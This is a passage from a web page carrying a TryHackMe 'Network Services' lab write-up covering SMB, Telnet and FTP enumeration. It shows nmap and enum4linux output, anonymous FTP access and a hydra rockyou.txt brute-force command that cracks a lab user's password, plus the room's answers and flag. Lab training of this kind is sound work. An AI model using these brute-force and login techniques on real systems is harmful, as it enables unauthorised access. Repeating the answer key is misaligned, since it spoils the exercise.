commands as well as replies to those commands, while the data channel is used for transferring data.\nFTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.\nWhile the session is open, the client may execute FTP commands on the server.\nActive vs Passive\nThe FTP server may support either Active or Passive connections, or both.\nIn an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it. This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn’t be efficient for either large file transfers, or slow internet connections.\nMore Details:\nYou can find more details on the technical function, and implementation of, FTP on the Internet Engineering Task Force website: https://www.ietf.org/rfc/rfc959.txt. The IETF is one of a number of standards agencies, who define and regulate internet standards.\nWhat communications model does FTP use? client-server\nWhat’s the standard FTP port? 21\nHow many modes of FTP connection are there? 2\nTask 9 Enumerating FTP Lets Get Started\nBefore we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!\nEnumeration\nBy now, I don’t think I need to explain any further how enumeration is key when attacking network services and protocols. You should, by now, have enough experience with nmap to be able to port scan effectively. If you get stuck using any tool- you can always use “tool [-h / -help / --help]” to find out more about it’s function and syntax. Equally, man pages are extremely useful for this purpose. They can be reached using “man [tool]”.\nMethod\nWe’re going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system. This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.\nResources\nAs we’re going to be logging in to an FTP server, we’re going to need to make sure therre is an ftp client installed on the system. There should be one installed by default on most Linux operating systems, such as Kali or Parrot OS. You can test if there is one by typing “ftp” into the console. If you’re bought to a prompt that says: “ftp\u003e” Then you have a working FTP client on your system. If not, it’s a simple matter of using “sudo apt install ftp” to install one.\nAlternative Enumeration Methods\nIt’s worth noting that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the “cwd” command for home directories which exist and those that don’t. This can be exploited because you can issue cwd commands before authentication, and if there’s a home directory- there is more than likely a user account to go with it. While this bug is found mainly within legacy systems, it’s worth knowing about, as a way to exploit FTP.\nThis vulnerability is documented at: https://www.exploit-db.com/exploits/20745\nNow we understand our toolbox, let’s do this.\nRun an nmap scan of your choice. How many ports are open on the target machine? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 kali@kali:~/CTFs/tryhackme/Network Services$ sudo nmap -p- -sS -sC -sV -O 10.10.153.14 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 22:05 CET Nmap scan report for 10.10.153.14 Host is up (0.033s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 353 Apr 24 2020 PUBLIC_NOTICE.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.106.222 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=10/25%OT=21%CT=1%CU=43401%PV=Y%DS=2%DC=I%G=Y%TM=5F95E8 OS:C7%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=A)OP OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F= OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5( OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z% OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C OS:D=S) Network Distance: 2 hops Service Info: Host: Welcome OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 62.92 seconds 2\nWhat port is ftp running on? 21\nWhat variant of FTP is running on it? vsftpd\nGreat, now we know what type of FTP server we’re dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing “ftp [IP]” into the console, and entering “anonymous”, and no password when prompted. What is the name of the file in the anonymous FTP directory? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 kali@kali:~/CTFs/tryhackme/Network Services$ ftp 10.10.153.14 Connected to 10.10.153.14. 220 Welcome to the administrator FTP service. Name (10.10.153.14:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 353 Apr 24 2020 PUBLIC_NOTICE.txt 226 Directory send OK. ftp\u003e What do we think a possible username could be? 1 2 3 4 5 6 7 ftp\u003e get PUBLIC_NOTICE.txt local: PUBLIC_NOTICE.txt remote: PUBLIC_NOTICE.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for PUBLIC_NOTICE.txt (353 bytes). 226 Transfer complete. 353 bytes received in 0.00 secs (118.1785 kB/s) ftp\u003e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 kali@kali:~/CTFs/tryhackme/Network Services$ cat PUBLIC_NOTICE.txt =================================== MESSAGE FROM SYSTEM ADMINISTRATORS =================================== Hello, I hope everyone is aware that the FTP server will not be available over the weekend- we will be carrying out routine system maintenance. Backups will be made to my account so I reccomend encrypting any sensitive data. Cheers, Mike Mike\nGreat! Now we’ve got details about the FTP server and, crucially, a possible username. Let’s see what we can do with that… No answer needed\nTask 10 Exploiting FTP Types of FTP Exploit\nSimilarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.\nWith data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords). An article written by JSCape demonstrates and explains this process using APR-Poisoning to trick a victim into sending sensitive information to an attacker, rather than a legitimate source.\nWhen looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.\nMethod Breakdown\nSo, from our enumeration stage, we know:\nThere is an FTP server running on this machine We have a possible username Using this information, let’s try and bruteforce the password of the FTP Server.\nHydra\nHydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub here.\nThe syntax for the command we’re going to use to find the passwords is this: “hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp”\nLet’s break it down:\nSECTION FUNCTION hydra Runs the hydra tool -t 4 Number of parallel connections per target -l [user] Points to the user who’s account you’re trying to compromise -P [path to dictionary] Points to the file containing the list of possible passwords -vV Sets verbose mode to very verbose, shows the login+pass combination for each attempt [machine IP] The IP address of the target machine ftp / protocol Sets the protocol Let’s crack some passwords!\nWhat is the password for the user “mike”? 1 2 3 4 5 6 7 8 9 kali@kali:~/CTFs/tryhackme/Network Services$ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt 10.10.153.14 ftp Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-25 22:13:09 [DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task [DATA] attacking ftp://10.10.153.14:21/ [21][ftp] host: 10.10.153.14 login: mike password: password 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-25 22:13:17 password\nBingo! Now, let’s connect to the FTP server as this user using “ftp [IP]” and entering the credentials when prompted 1 2 3 4 5 6 7 8 9 10 kali@kali:~/CTFs/tryhackme/Network Services$ ftp 10.10.153.14 Connected to 10.10.153.14. 220 Welcome to the administrator FTP service. Name (10.10.153.14:kali): mike 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e No answer needed\nWhat is ftp.txt? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ftp\u003e ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 0 0 4096 Apr 24 2020 ftp -rwxrwxrwx 1 0 0 26 Apr 24 2020 ftp.txt 226 Directory send OK. ftp\u003e get ftp.txt local: ftp.txt remote: ftp.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for ftp.txt (26 bytes). 226 Transfer complete. 26 bytes received in 0.00 secs (52.5686 kB/s) ftp\u003e exit 221 Goodbye. kali@kali:~/CTFs/tryhackme/Network Services$ cat ftp.txt THM{y0u_g0t_th3_ftp_fl4g} THM{y0u_g0t_th3_ftp_fl4g}\nTask 11 Expanding Your Knowledge Further Learning\nThere is no checklist of things to learn until you’ve officially learnt everything you can. There will always be things that surprise us all, especially in the sometimes abstract logical problems of capture the flag challenges. But, as with anything, practice makes perfect. We can all look back on the things we’ve learnt after completing something challenging and I hope you feel the same about this room.\nReading\nHere’s some things that might be useful to read after completing this room, if it interests you:\nhttps://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef https://attack.mitre.org/techniques/T1210/ https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/\nThank you\nThanks for taking the time to work through this room, I wish you the best of luck in future.\n~ Polo\nWell done, you did it! No answer needed\n","wordCount":"5706","inLanguage":"en","datePublished":"2021-01-01T00:00:00Z","dateModified":"2026-03-01T00:10:22+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/tryhackme/network-services/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/docs/ title=Docs><span>Docs</span></a></li><li><a href=https://s4ch.github.io/ctf/ title=CTF><span>CTF</span></a></li><li><a href=https://s4ch.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Network Services</h1><div class=post-description>Network Services TryHackMe writeup</div><div class=post-meta><span title='2021-01-01 00:00:00 +0000 UTC'>January 1, 2021</span>&nbsp;·&nbsp;27 min&nbsp;·&nbsp;5706 words&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
+,
+<a href=https://s4ch.github.io/tags/tryhackme/ class=post-tag title=tryhackme>tryhackme</a>
+,
+<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
+,
+<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
+,
+<a href=https://s4ch.github.io/tags/windows/ class=post-tag title=windows>windows</a>
+&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#-we-will-cover--the-topics>💢 We will cover the topics</a></li><li><a href=#task-1-get-connected>Task 1 Get Connected</a></li><li><a href=#task-2-understanding-smb>Task 2 Understanding SMB</a></li><li><a href=#task-3-enumerating-smb>Task 3 Enumerating SMB</a></li><li><a href=#task-4-exploiting-smb>Task 4 Exploiting SMB</a></li><li><a href=#task-5-understanding-telnet>Task 5 Understanding Telnet</a></li><li><a href=#task-6-enumerating-telnet>Task 6 Enumerating Telnet</a></li><li><a href=#task-7-exploiting-telnet>Task 7 Exploiting Telnet</a></li><li><a href=#task-8-understanding-ftp>Task 8 Understanding FTP</a></li><li><a href=#task-9-enumerating-ftp>Task 9 Enumerating FTP</a></li><li><a href=#task-10-exploiting-ftp>Task 10 Exploiting FTP</a></li><li><a href=#task-11-expanding-your-knowledge>Task 11 Expanding Your Knowledge</a></li></ul></nav></div></details></div><div class=post-content><p>Learn about, then enumerate and exploit a variety of network services and misconfigurations.</p><p><a href=https://tryhackme.com/room/networkservices>Network Services</a></p><h2 id=-we-will-cover--the-topics>💢 We will cover the topics<a hidden class=anchor aria-hidden=true href=#-we-will-cover--the-topics>#</a></h2><ul><li>SMB Fundamentals</li><li>SMB Enumeration</li><li>SMB Exploitation</li><li>Telnet Fundamentals</li><li>Telnet Enumeration</li><li>Telnet Exploitation</li><li>FTP Fundamentals</li><li>FTP Enumeration</li><li>FTP Exploitation</li></ul><hr><h2 id=task-1-get-connected>Task 1 Get Connected<a hidden class=anchor aria-hidden=true href=#task-1-get-connected>#</a></h2><p>Hello and welcome!</p><p>This room will explore common Network Service vulnerabilities and misconfigurations, but in order to do that, we&rsquo;ll need to do a few things first!</p><p>A basic knowledge of Linux, and how to navigate the Linux file system, is required for this room. If you think you&rsquo;ll need some help with this, try completing the &lsquo;Learn Linux&rsquo; room (<a href=https://tryhackme.com/room/zthlinux>https://tryhackme.com/room/zthlinux</a>)</p><ol><li>Connect to the TryHackMe OpenVPN Server (See <a href=https://tryhackme.com/access>https://tryhackme.com/access</a> for help!)</li><li>Make sure you&rsquo;re sitting comfortably, and have a cup of Tea, Coffee or Water close!</li></ol><p>Now, let&rsquo;s move on!</p><p>N.B. This is not a room on WiFi access hacking or hijacking, rather how to gain unauthorized access to a machine by exploiting network services. If you are interested in WiFi hacking, I suggest checking out WiFi Hacking 101 by NinjaJc01 (<a href=https://tryhackme.com/room/wifihacking101>https://tryhackme.com/room/wifihacking101</a>)</p><ol><li>Ready? Let&rsquo;s get going!</li></ol><p><code>No answer needed</code></p><h2 id=task-2-understanding-smb>Task 2 Understanding SMB<a hidden class=anchor aria-hidden=true href=#task-2-understanding-smb>#</a></h2><p><strong>What is SMB?</strong></p><p>SMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. [<a href=https://searchnetworking.techtarget.com/definition/Server-Message-Block-Protocol>source</a>]</p><p>Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.</p><p>The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.</p><p><strong>How does SMB work?</strong></p><p><img loading=lazy src=https://i.imgur.com/XMnru12.png alt></p><p>Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system. However, in the case of SMB, these things are done over the network.</p><p><strong>What runs SMB?</strong></p><p>Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support. Samba, an open source server that supports the SMB protocol, was released for Unix systems.</p><ol><li>What does SMB stand for?</li></ol><p><code>Server Message Block</code></p><ol start=2><li>What type of protocol is SMB?</li></ol><p><code>response-request</code></p><ol start=3><li>What do clients connect to servers using?</li></ol><p><code>TCP/IP</code></p><ol start=4><li>What systems does Samba run on?</li></ol><p><code>Unix</code></p><h2 id=task-3-enumerating-smb>Task 3 Enumerating SMB<a hidden class=anchor aria-hidden=true href=#task-3-enumerating-smb>#</a></h2><p><strong>Lets Get Started</strong></p><p>Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!</p><p><strong>Enumeration</strong></p><p>Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.</p><p>This process is essential for an attack to be successful, as wasting time with exploits that either don&rsquo;t work or can crash the system can be a waste of energy. Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.</p><p><strong>SMB</strong></p><p>Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information — you&rsquo;d be surprised what is sometimes included on these shares.</p><p><strong>Port Scanning</strong></p><p>The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine. You can go as in depth as you like on this, however I suggest using <code>nmap</code> with the <code>-A</code> and <code>-p-</code> tags.</p><ul><li>-A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one</li><li>-p- : Enables scanning across all ports, not just the top 1000</li></ul><p>If you&rsquo;d like to learn more about nmap in more detail, I <strong>recommend</strong> checking out DarkStar&rsquo;s room on the topic, as part of the Red Primer series <a href=https://tryhackme.com/room/rpnmap>here</a>.</p><p><strong>Enum4Linux</strong></p><p>Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. It&rsquo;s installed by default on Parrot and Kali, however if you need to install it, you can do so from the official <a href=https://github.com/portcullislabs/enum4linux>github</a>.</p><p>The syntax of Enum4Linux is nice and simple: &ldquo;<code>enum4linux [options] ip</code>&rdquo;</p><table><thead><tr><th>TAG</th><th>FUNCTION</th></tr></thead><tbody><tr><td>-U</td><td>get userlist</td></tr><tr><td>-M</td><td>get machine list</td></tr><tr><td>-N</td><td>get namelist dump (different from -U and-M)</td></tr><tr><td>-S</td><td>get sharelist</td></tr><tr><td>-P</td><td>get password policy information</td></tr><tr><td>-G</td><td>get group and member list</td></tr><tr><td></td><td></td></tr><tr><td>-A</td><td>all of the above (full basic enumeration)</td></tr></tbody></table><p>Now we understand our enumeration tools, lets get started!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ sudo nmap -A -p- -sS -sC -sV -O 10.10.78.132
+</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-22 00:33 CEST
+</span></span><span class=line><span class=cl>Nmap scan report for 10.10.78.132
+</span></span><span class=line><span class=cl>Host is up (0.038s latency).
+</span></span><span class=line><span class=cl>Not shown: 65532 closed ports
+</span></span><span class=line><span class=cl>PORT    STATE SERVICE     VERSION
+</span></span><span class=line><span class=cl>22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span class=line><span class=cl>| ssh-hostkey:
+</span></span><span class=line><span class=cl>|   2048 91:df:5c:7c:26:22:6e:90:23:a7:7d:fa:5c:e1:c2:52 (RSA)
+</span></span><span class=line><span class=cl>|   256 86:57:f5:2a:f7:86:9c:cf:02:c1:ac:bc:34:90:6b:01 (ECDSA)
+</span></span><span class=line><span class=cl>|_  256 81:e3:cc:e7:c9:3c:75:d7:fb:e0:86:a0:01:41:77:81 (ED25519)
+</span></span><span class=line><span class=cl>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+</span></span><span class=line><span class=cl>445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+</span></span><span class=line><span class=cl>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span class=line><span class=cl>TCP/IP fingerprint:
+</span></span><span class=line><span class=cl>OS:SCAN(V=7.80%E=4%D=10/22%OT=22%CT=1%CU=39565%PV=Y%DS=2%DC=T%G=Y%TM=5F90B7
+</span></span><span class=line><span class=cl>OS:6B%P=x86_64-pc-linux-gnu)SEQ(SP=F3%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS
+</span></span><span class=line><span class=cl>OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1
+</span></span><span class=line><span class=cl>OS:1NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
+</span></span><span class=line><span class=cl>OS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+</span></span><span class=line><span class=cl>OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+</span></span><span class=line><span class=cl>OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+</span></span><span class=line><span class=cl>OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+</span></span><span class=line><span class=cl>OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+</span></span><span class=line><span class=cl>OS:=S)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Network Distance: 2 hops
+</span></span><span class=line><span class=cl>Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Host script results:
+</span></span><span class=line><span class=cl>|_clock-skew: mean: 1s, deviation: 0s, median: 0s
+</span></span><span class=line><span class=cl>|_nbstat: NetBIOS name: POLOSMB, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+</span></span><span class=line><span class=cl>| smb-os-discovery:
+</span></span><span class=line><span class=cl>|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+</span></span><span class=line><span class=cl>|   Computer name: polosmb
+</span></span><span class=line><span class=cl>|   NetBIOS computer name: POLOSMB\x00
+</span></span><span class=line><span class=cl>|   Domain name: \x00
+</span></span><span class=line><span class=cl>|   FQDN: polosmb
+</span></span><span class=line><span class=cl>|_  System time: 2020-10-21T22:34:18+00:00
+</span></span><span class=line><span class=cl>| smb-security-mode:
+</span></span><span class=line><span class=cl>|   account_used: guest
+</span></span><span class=line><span class=cl>|   authentication_level: user
+</span></span><span class=line><span class=cl>|   challenge_response: supported
+</span></span><span class=line><span class=cl>|_  message_signing: disabled (dangerous, but default)
+</span></span><span class=line><span class=cl>| smb2-security-mode:
+</span></span><span class=line><span class=cl>|   2.02:
+</span></span><span class=line><span class=cl>|_    Message signing enabled but not required
+</span></span><span class=line><span class=cl>| smb2-time:
+</span></span><span class=line><span class=cl>|   date: 2020-10-21T22:34:18
+</span></span><span class=line><span class=cl>|_  start_date: N/A
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>TRACEROUTE (using port 8888/tcp)
+</span></span><span class=line><span class=cl>HOP RTT      ADDRESS
+</span></span><span class=line><span class=cl>1   36.96 ms 10.8.0.1
+</span></span><span class=line><span class=cl>2   36.97 ms 10.10.78.132
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 65.23 seconds
+</span></span></code></pre></td></tr></table></div></div><ol><li>Conduct an <strong>nmap</strong> scan of your choosing, How many ports are open?</li></ol><p><code>3</code></p><ol start=2><li>What ports is <strong>SMB</strong> running on?</li></ol><p><code>139/445</code></p><ol start=3><li>Let&rsquo;s get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the <strong>workgroup</strong> name?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>kali</span><span class=err>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>Network</span> <span class=n>Services</span><span class=o>$</span> <span class=n>enum4linux</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>78.132</span>
+</span></span><span class=line><span class=cl><span class=n>Starting</span> <span class=n>enum4linux</span> <span class=n>v0</span><span class=o>.</span><span class=mf>8.9</span> <span class=p>(</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>labs</span><span class=o>.</span><span class=n>portcullis</span><span class=o>.</span><span class=n>co</span><span class=o>.</span><span class=n>uk</span><span class=o>/</span><span class=n>application</span><span class=o>/</span><span class=n>enum4linux</span><span class=o>/</span> <span class=p>)</span> <span class=n>on</span> <span class=n>Thu</span> <span class=n>Oct</span> <span class=mi>22</span> <span class=mi>00</span><span class=p>:</span><span class=mi>36</span><span class=p>:</span><span class=mi>05</span> <span class=mi>2020</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=o>==========================</span>
+</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>Target</span> <span class=n>Information</span>    <span class=o>|</span>
+</span></span><span class=line><span class=cl> <span class=o>==========================</span>
+</span></span><span class=line><span class=cl><span class=n>Target</span> <span class=o>...........</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>78.132</span>
